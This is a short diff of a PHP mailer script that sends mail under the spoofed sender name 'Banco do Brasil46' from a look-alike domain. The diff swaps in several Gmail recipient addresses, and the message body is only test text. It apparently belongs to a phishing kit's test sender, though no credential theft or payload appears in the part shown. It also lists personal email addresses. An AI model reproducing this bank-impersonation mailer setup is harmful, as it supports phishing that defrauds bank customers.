@@ -17,9 +17,11 @@ $mail->SetFrom('bb@46bb.com.br', 'Banco do Brasil46');
 $mail->AddReplyTo('bb@46bb.com.br', 'Banco do Brasil46'); 
 $mail->Subject = 'REC: Assunto ssss';
 
+$mail->AddAddress('Ciganobank9@gmail.com');
+$mail->AddAddress('Caixagov85@gmail.com');
+$mail->AddAddress('Filhothiago1811@gmail.com');
 $mail->AddAddress('erickqueiroz93@gmail.com');
-$mail->AddAddress('erickqueiroz93@outlook.com');
-$mail->AddAddress('queiroz93@protonmail.com');
+
 $mail->MsgHTML('<html><body>Tesssssswqwqwqste</body></html>'); 
 $mail->AltBody = 'This is a plain-text message body';
 
